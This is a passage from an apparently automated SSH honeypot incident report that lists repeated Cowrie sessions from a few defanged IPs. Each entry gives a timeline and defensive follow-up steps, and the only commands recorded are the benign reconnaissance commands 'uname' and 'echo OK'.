- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cfdd2716265

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:46 |
| **Last Seen** | 2026-06-25 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:46:21` | `cowrie.session.connect` |
| `2026-06-25 18:46:21` | `cowrie.client.version` |
| `2026-06-25 18:46:21` | `cowrie.client.kex` |
| `2026-06-25 18:46:21` | `cowrie.login.success` |
| `2026-06-25 18:46:22` | `cowrie.session.params` |
| `2026-06-25 18:46:22` | `cowrie.command.input` |
| `2026-06-25 18:46:22` | `cowrie.log.closed` |
| `2026-06-25 18:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b6ce2beb3d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:47 |
| **Last Seen** | 2026-06-25 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:47:12` | `cowrie.session.connect` |
| `2026-06-25 18:47:12` | `cowrie.client.version` |
| `2026-06-25 18:47:12` | `cowrie.client.kex` |
| `2026-06-25 18:47:12` | `cowrie.login.success` |
| `2026-06-25 18:47:13` | `cowrie.session.params` |
| `2026-06-25 18:47:13` | `cowrie.command.input` |
| `2026-06-25 18:47:13` | `cowrie.log.closed` |
| `2026-06-25 18:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a4adf04bcc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:48 |
| **Last Seen** | 2026-06-25 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:48:02` | `cowrie.session.connect` |
| `2026-06-25 18:48:02` | `cowrie.client.version` |
| `2026-06-25 18:48:03` | `cowrie.client.kex` |
| `2026-06-25 18:48:03` | `cowrie.login.success` |
| `2026-06-25 18:48:04` | `cowrie.session.params` |
| `2026-06-25 18:48:04` | `cowrie.command.input` |
| `2026-06-25 18:48:04` | `cowrie.log.closed` |
| `2026-06-25 18:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702616317ed1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:48 |
| **Last Seen** | 2026-06-25 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:48:53` | `cowrie.session.connect` |
| `2026-06-25 18:48:53` | `cowrie.client.version` |
| `2026-06-25 18:48:53` | `cowrie.client.kex` |
| `2026-06-25 18:48:53` | `cowrie.login.success` |
| `2026-06-25 18:48:54` | `cowrie.session.params` |
| `2026-06-25 18:48:54` | `cowrie.command.input` |
| `2026-06-25 18:48:54` | `cowrie.log.closed` |
| `2026-06-25 18:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7873f671bf05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:49 |
| **Last Seen** | 2026-06-25 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:49:42` | `cowrie.session.connect` |
| `2026-06-25 18:49:42` | `cowrie.client.version` |
| `2026-06-25 18:49:43` | `cowrie.client.kex` |
| `2026-06-25 18:49:43` | `cowrie.login.success` |
| `2026-06-25 18:49:43` | `cowrie.session.params` |
| `2026-06-25 18:49:43` | `cowrie.command.input` |
| `2026-06-25 18:49:44` | `cowrie.log.closed` |
| `2026-06-25 18:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcda77cc8c25

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 18:50 |
| **Last Seen** | 2026-06-25 18:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:50:24` | `cowrie.session.connect` |
| `2026-06-25 18:50:24` | `cowrie.client.version` |
| `2026-06-25 18:50:24` | `cowrie.client.kex` |
| `2026-06-25 18:50:26` | `cowrie.login.success` |
| `2026-06-25 18:50:28` | `cowrie.session.params` |
| `2026-06-25 18:50:28` | `cowrie.command.input` |
| `2026-06-25 18:50:28` | `cowrie.log.closed` |
| `2026-06-25 18:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed9cf58d484

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:50 |
| **Last Seen** | 2026-06-25 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:50:32` | `cowrie.session.connect` |
| `2026-06-25 18:50:32` | `cowrie.client.version` |
| `2026-06-25 18:50:32` | `cowrie.client.kex` |
| `2026-06-25 18:50:33` | `cowrie.login.success` |
| `2026-06-25 18:50:33` | `cowrie.session.params` |
| `2026-06-25 18:50:33` | `cowrie.command.input` |
| `2026-06-25 18:50:34` | `cowrie.log.closed` |
| `2026-06-25 18:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc886efef6f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:51 |
| **Last Seen** | 2026-06-25 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:51:22` | `cowrie.session.connect` |
| `2026-06-25 18:51:22` | `cowrie.client.version` |
| `2026-06-25 18:51:22` | `cowrie.client.kex` |
| `2026-06-25 18:51:23` | `cowrie.login.success` |
| `2026-06-25 18:51:23` | `cowrie.session.params` |
| `2026-06-25 18:51:23` | `cowrie.command.input` |
| `2026-06-25 18:51:23` | `cowrie.log.closed` |
| `2026-06-25 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ce12405199

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:52 |
| **Last Seen** | 2026-06-25 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:52:14` | `cowrie.session.connect` |
| `2026-06-25 18:52:14` | `cowrie.client.version` |
| `2026-06-25 18:52:14` | `cowrie.client.kex` |
| `2026-06-25 18:52:15` | `cowrie.login.success` |
| `2026-06-25 18:52:15` | `cowrie.session.params` |
| `2026-06-25 18:52:15` | `cowrie.command.input` |
| `2026-06-25 18:52:16` | `cowrie.log.closed` |
| `2026-06-25 18:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87cec3014a5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:53 |
| **Last Seen** | 2026-06-25 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:53:07` | `cowrie.session.connect` |
| `2026-06-25 18:53:07` | `cowrie.client.version` |
| `2026-06-25 18:53:07` | `cowrie.client.kex` |
| `2026-06-25 18:53:07` | `cowrie.login.success` |
| `2026-06-25 18:53:08` | `cowrie.session.params` |
| `2026-06-25 18:53:08` | `cowrie.command.input` |
| `2026-06-25 18:53:08` | `cowrie.log.closed` |
| `2026-06-25 18:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdaae729127

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:53 |
| **Last Seen** | 2026-06-25 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:53:59` | `cowrie.session.connect` |
| `2026-06-25 18:53:59` | `cowrie.client.version` |
| `2026-06-25 18:53:59` | `cowrie.client.kex` |
| `2026-06-25 18:54:00` | `cowrie.login.success` |
| `2026-06-25 18:54:00` | `cowrie.session.params` |
| `2026-06-25 18:54:00` | `cowrie.command.input` |
| `2026-06-25 18:54:01` | `cowrie.log.closed` |
| `2026-06-25 18:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5449bb9f4f6d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:54 |
| **Last Seen** | 2026-06-25 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:54:52` | `cowrie.session.connect` |
| `2026-06-25 18:54:52` | `cowrie.client.version` |
| `2026-06-25 18:54:52` | `cowrie.client.kex` |
| `2026-06-25 18:54:52` | `cowrie.login.success` |
| `2026-06-25 18:54:53` | `cowrie.session.params` |
| `2026-06-25 18:54:53` | `cowrie.command.input` |
| `2026-06-25 18:54:53` | `cowrie.log.closed` |
| `2026-06-25 18:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04284e7f4a2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 18:55 |
| **Last Seen** | 2026-06-25 18:55 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:55:27` | `cowrie.session.connect` |
| `2026-06-25 18:55:28` | `cowrie.client.version` |
| `2026-06-25 18:55:28` | `cowrie.client.kex` |
| `2026-06-25 18:55:45` | `cowrie.login.success` |
| `2026-06-25 18:55:49` | `cowrie.session.params` |
| `2026-06-25 18:55:49` | `cowrie.command.input` |
| `2026-06-25 18:55:50` | `cowrie.log.closed` |
| `2026-06-25 18:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f73bb983de0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:55 |
| **Last Seen** | 2026-06-25 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:55:43` | `cowrie.session.connect` |
| `2026-06-25 18:55:43` | `cowrie.client.version` |
| `2026-06-25 18:55:44` | `cowrie.client.kex` |
| `2026-06-25 18:55:44` | `cowrie.login.success` |
| `2026-06-25 18:55:45` | `cowrie.session.params` |
| `2026-06-25 18:55:45` | `cowrie.command.input` |
| `2026-06-25 18:55:45` | `cowrie.log.closed` |
| `2026-06-25 18:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416450cf52a4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:56 |
| **Last Seen** | 2026-06-25 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:56:32` | `cowrie.session.connect` |
| `2026-06-25 18:56:32` | `cowrie.client.version` |
| `2026-06-25 18:56:33` | `cowrie.client.kex` |
| `2026-06-25 18:56:33` | `cowrie.login.success` |
| `2026-06-25 18:56:34` | `cowrie.session.params` |
| `2026-06-25 18:56:34` | `cowrie.command.input` |
| `2026-06-25 18:56:34` | `cowrie.log.closed` |
| `2026-06-25 18:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966bdf62494b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:57 |
| **Last Seen** | 2026-06-25 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:57:23` | `cowrie.session.connect` |
| `2026-06-25 18:57:23` | `cowrie.client.version` |
| `2026-06-25 18:57:23` | `cowrie.client.kex` |
| `2026-06-25 18:57:23` | `cowrie.login.success` |
| `2026-06-25 18:57:24` | `cowrie.session.params` |
| `2026-06-25 18:57:24` | `cowrie.command.input` |
| `2026-06-25 18:57:24` | `cowrie.log.closed` |
| `2026-06-25 18:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c103605ec8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:58 |
| **Last Seen** | 2026-06-25 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:58:13` | `cowrie.session.connect` |
| `2026-06-25 18:58:13` | `cowrie.client.version` |
| `2026-06-25 18:58:13` | `cowrie.client.kex` |
| `2026-06-25 18:58:13` | `cowrie.login.success` |
| `2026-06-25 18:58:14` | `cowrie.session.params` |
| `2026-06-25 18:58:14` | `cowrie.command.input` |
| `2026-06-25 18:58:14` | `cowrie.log.closed` |
| `2026-06-25 18:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79c541d9423

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:59 |
| **Last Seen** | 2026-06-25 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:59:04` | `cowrie.session.connect` |
| `2026-06-25 18:59:04` | `cowrie.client.version` |
| `2026-06-25 18:59:04` | `cowrie.client.kex` |
| `2026-06-25 18:59:05` | `cowrie.login.success` |
| `2026-06-25 18:59:05` | `cowrie.session.params` |
| `2026-06-25 18:59:05` | `cowrie.command.input` |
| `2026-06-25 18:59:05` | `cowrie.log.closed` |
| `2026-06-25 18:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b8d33fd8d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:59 |
| **Last Seen** | 2026-06-25 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:59:57` | `cowrie.session.connect` |
| `2026-06-25 18:59:57` | `cowrie.client.version` |
| `2026-06-25 18:59:57` | `cowrie.client.kex` |
| `2026-06-25 18:59:58` | `cowrie.login.success` |
| `2026-06-25 18:59:58` | `cowrie.session.params` |
| `2026-06-25 18:59:58` | `cowrie.command.input` |
| `2026-06-25 18:59:59` | `cowrie.log.closed` |
| `2026-06-25 18:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02ac19e5d98

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:00 |
| **Last Seen** | 2026-06-25 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:00:50` | `cowrie.session.connect` |
| `2026-06-25 19:00:50` | `cowrie.client.version` |
| `2026-06-25 19:00:50` | `cowrie.client.kex` |
| `2026-06-25 19:00:50` | `cowrie.login.success` |
| `2026-06-25 19:00:51` | `cowrie.session.params` |
| `2026-06-25 19:00:51` | `cowrie.command.input` |
| `2026-06-25 19:00:51` | `cowrie.log.closed` |
| `2026-06-25 19:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaba9adaafaa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:01 |
| **Last Seen** | 2026-06-25 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:01:43` | `cowrie.session.connect` |
| `2026-06-25 19:01:43` | `cowrie.client.version` |
| `2026-06-25 19:01:43` | `cowrie.client.kex` |
| `2026-06-25 19:01:44` | `cowrie.login.success` |
| `2026-06-25 19:01:44` | `cowrie.session.params` |
| `2026-06-25 19:01:44` | `cowrie.command.input` |
| `2026-06-25 19:01:44` | `cowrie.log.closed` |
| `2026-06-25 19:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0acef60defcb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:02 |
| **Last Seen** | 2026-06-25 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:02:36` | `cowrie.session.connect` |
| `2026-06-25 19:02:36` | `cowrie.client.version` |
| `2026-06-25 19:02:36` | `cowrie.client.kex` |
| `2026-06-25 19:02:37` | `cowrie.login.success` |
| `2026-06-25 19:02:38` | `cowrie.session.params` |
| `2026-06-25 19:02:38` | `cowrie.command.input` |
| `2026-06-25 19:02:38` | `cowrie.log.closed` |
| `2026-06-25 19:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bcc00358995

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:03 |
| **Last Seen** | 2026-06-25 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:03:28` | `cowrie.session.connect` |
| `2026-06-25 19:03:28` | `cowrie.client.version` |
| `2026-06-25 19:03:28` | `cowrie.client.kex` |
| `2026-06-25 19:03:28` | `cowrie.login.success` |
| `2026-06-25 19:03:29` | `cowrie.session.params` |
| `2026-06-25 19:03:29` | `cowrie.command.input` |
| `2026-06-25 19:03:29` | `cowrie.log.closed` |
| `2026-06-25 19:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aab72a185a0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:04 |
| **Last Seen** | 2026-06-25 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:04:20` | `cowrie.session.connect` |
| `2026-06-25 19:04:20` | `cowrie.client.version` |
| `2026-06-25 19:04:20` | `cowrie.client.kex` |
| `2026-06-25 19:04:20` | `cowrie.login.success` |
| `2026-06-25 19:04:21` | `cowrie.session.params` |
| `2026-06-25 19:04:21` | `cowrie.command.input` |
| `2026-06-25 19:04:21` | `cowrie.log.closed` |
| `2026-06-25 19:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019da41c7105

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 19:05 |
| **Last Seen** | 2026-06-25 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:05:03` | `cowrie.session.connect` |
| `2026-06-25 19:05:03` | `cowrie.client.version` |
| `2026-06-25 19:05:03` | `cowrie.client.kex` |
| `2026-06-25 19:05:05` | `cowrie.login.success` |
| `2026-06-25 19:05:07` | `cowrie.session.params` |
| `2026-06-25 19:05:07` | `cowrie.command.input` |
| `2026-06-25 19:05:08` | `cowrie.log.closed` |
| `2026-06-25 19:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255a89bbb1e6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:05 |
| **Last Seen** | 2026-06-25 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:05:13` | `cowrie.session.connect` |
| `2026-06-25 19:05:13` | `cowrie.client.version` |
| `2026-06-25 19:05:13` | `cowrie.client.kex` |
| `2026-06-25 19:05:13` | `cowrie.login.success` |
| `2026-06-25 19:05:14` | `cowrie.session.params` |
